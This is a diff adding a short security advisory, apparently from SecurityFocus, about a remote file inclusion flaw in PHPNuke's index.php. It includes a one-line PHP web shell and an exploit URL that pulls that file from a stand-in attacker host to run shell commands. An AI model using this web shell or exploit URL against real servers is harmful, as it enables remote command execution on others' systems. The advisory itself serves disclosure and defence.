@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/3889/info
+
+PHPNuke is a website creation/maintenance tool.
+
+The 'index.php' script has a feature which allows users to include files. Due to insufficent input validation, it is possible to include files located on a remote server. Arbitrary code in the attacker's included file may be executed.
+
+As one consequence of this issue, a remote attacker can cause commands to be executed on the shell of the host running vulnerable versions of PHPNuke. Commands will be executed with the privileges of the webserver process and may result in the attacker gaining local access.
+
+It is not known whether this vulnerability affects PostNuke, though the possibility exists. 
+
+Create the following file on a remote server:
+
+<?php
+system($cmd);
+?>
+
+The following URL will include the malicious file and allow the attacker to execute the "la -la" command on the shell of the host running PHPNuke:
+
+http://insecure-server/index.php?file=http://where.the.bad.php.file.is/evil.php&cmd=ls%20-al
+
+
